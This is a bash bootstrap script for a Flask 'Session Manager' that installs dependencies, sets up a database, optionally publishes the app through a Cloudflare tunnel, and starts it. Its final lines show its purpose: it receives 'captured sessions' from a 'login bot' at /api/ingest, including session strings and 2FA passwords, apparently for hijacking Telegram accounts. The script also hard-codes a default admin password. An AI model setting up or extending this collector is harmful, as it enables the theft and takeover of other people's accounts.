#!/bin/bash
# Manager — one-shot bootstrap
# Installs deps, inits DB, optionally starts Cloudflare tunnel, runs the Flask app.
set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

APP_DIR="$(cd "$(dirname "$0")" && pwd)"
ENV_FILE="$APP_DIR/.env"
VENV="$APP_DIR/venv"
PORT="${PORT:-5001}"

echo ""
echo -e "${GREEN}======================================${NC}"
echo -e "${GREEN}  Manager — Session Manager           ${NC}"
echo -e "${GREEN}======================================${NC}"
echo ""

# ---------- 1. Python deps ----------
echo -e "${YELLOW}[1/6] Checking Python…${NC}"
if ! command -v python3 &> /dev/null; then
  echo -e "${YELLOW}  Installing python3…${NC}"
  apt-get update -qq 2>/dev/null || true
  apt-get install -y -qq python3 python3-pip python3-venv 2>/dev/null || true
fi
echo -e "${GREEN}  ✓ $(python3 --version)${NC}"

# ---------- 2. venv + requirements ----------
echo -e "${YELLOW}[2/6] Setting up venv…${NC}"
if [ ! -d "$VENV" ]; then
  python3 -m venv "$VENV"
fi
# shellcheck disable=SC1091
source "$VENV/bin/activate"
pip install --upgrade pip -q
pip install -r "$APP_DIR/requirements.txt" -q
echo -e "${GREEN}  ✓ deps installed${NC}"

# ---------- 3. .env ----------
echo -e "${YELLOW}[3/6] Checking .env…${NC}"
if [ ! -f "$ENV_FILE" ]; then
  cp "$APP_DIR/.env.example" "$ENV_FILE"
  echo -e "${RED}  ✗ Created .env from template${NC}"
  echo -e "${BLUE}    Edit it first: nano $ENV_FILE${NC}"
  echo -e "${BLUE}    Then re-run: ./start.sh${NC}"
  exit 1
fi
# shellcheck disable=SC1090
source "$ENV_FILE"
if [ -z "$API_ID" ] || [ -z "$API_HASH" ]; then
  echo -e "${YELLOW}  ⚠ API_ID / API_HASH are empty in .env${NC}"
  echo -e "${YELLOW}    Manager UI will run but device / 2FA actions will fail until you set them.${NC}"
  echo -e "${YELLOW}    Edit: nano $ENV_FILE${NC}"
fi
echo -e "${GREEN}  ✓ .env ready${NC}"

# ---------- 4. DB init (handled by app.py on first run, but force once now) ----------
echo -e "${YELLOW}[4/6] Initializing database…${NC}"
"$VENV/bin/python3" -c "import sys; sys.path.insert(0, '$APP_DIR'); import db; db.init_db(); print('  ✓ DB ready')"

# ---------- 5. Kill old instances ----------
echo -e "${YELLOW}[5/6] Stopping old instances…${NC}"
pkill -9 -f "python.*app.py" 2>/dev/null || true
if command -v lsof &> /dev/null; then
  if lsof -ti:"$PORT" > /dev/null 2>&1; then
    kill -9 $(lsof -ti:"$PORT") 2>/dev/null || true
  fi
fi
echo -e "${GREEN}  ✓ Done${NC}"

# ---------- 6. Optional Cloudflare tunnel ----------
USE_TUNNEL="${USE_TUNNEL:-0}"
CF_URL=""
if [ "$USE_TUNNEL" = "1" ]; then
  echo -e "${YELLOW}[6/6] Starting Cloudflare tunnel…${NC}"
  if ! command -v cloudflared &> /dev/null; then
    echo -e "${BLUE}  Installing cloudflared…${NC}"
    wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O /usr/local/bin/cloudflared
    chmod +x /usr/local/bin/cloudflared
  fi
  pkill -9 -f cloudflared 2>/dev/null || true
  rm -f /tmp/cf_manager.log
  nohup cloudflared tunnel --url http://localhost:"$PORT" > /tmp/cf_manager.log 2>&1 &
  for i in $(seq 1 30); do
    sleep 1
    CF_URL=$(grep -oE 'https://[a-zA-Z0-9-]+\.trycloudflare\.com' /tmp/cf_manager.log 2>/dev/null | head -1)
    [ -n "$CF_URL" ] && break
    echo -n "."
  done
  echo ""
  if [ -n "$CF_URL" ]; then
    echo -e "${GREEN}  ✓ Public URL: $CF_URL${NC}"
  else
    echo -e "${YELLOW}  ⚠ Tunnel did not come up — running locally only${NC}"
  fi
else
  echo -e "${YELLOW}[6/6] Skipping Cloudflare tunnel (set USE_TUNNEL=1 to enable)${NC}"
fi

# ---------- launch ----------
echo ""
echo -e "${GREEN}======================================${NC}"
echo -e "${GREEN}  Manager starting…${NC}"
echo -e "${GREEN}======================================${NC}"
echo -e "  ${BLUE}Local:${NC}   http://localhost:$PORT"
[ -n "$CF_URL" ] && echo -e "  ${BLUE}Public:${NC}  $CF_URL"
echo -e "  ${BLUE}Logs:${NC}    tail -f $APP_DIR/app.log"
if [ "$USE_TUNNEL" = "1" ]; then
  echo -e "  ${BLUE}Stop:${NC}    pkill -f 'python.*app.py' && pkill cloudflared"
else
  echo -e "  ${BLUE}Stop:${NC}    pkill -f 'python.*app.py'"
fi
echo -e "  ${BLUE}Default admin password:${NC} manager123  (change in Settings)"
echo ""

cd "$APP_DIR"
nohup "$VENV/bin/python3" "$APP_DIR/app.py" >> "$APP_DIR/app.log" 2>&1 &
APP_PID=$!
sleep 2
if kill -0 $APP_PID 2>/dev/null; then
  echo -e "${GREEN}✓ Manager running (PID: $APP_PID)${NC}"
else
  echo -e "${RED}✗ Failed to start. Check $APP_DIR/app.log${NC}"
  tail -30 "$APP_DIR/app.log"
  exit 1
fi
echo ""
echo -e "${YELLOW}Send captured sessions from your login bot to:${NC}"
echo -e "  POST $([ -n "$CF_URL" ] && echo "$CF_URL" || echo "http://localhost:$PORT")/api/ingest"
echo -e "  Body: { phone, user_id, username, name, session_string, twofa_password }"
echo ""
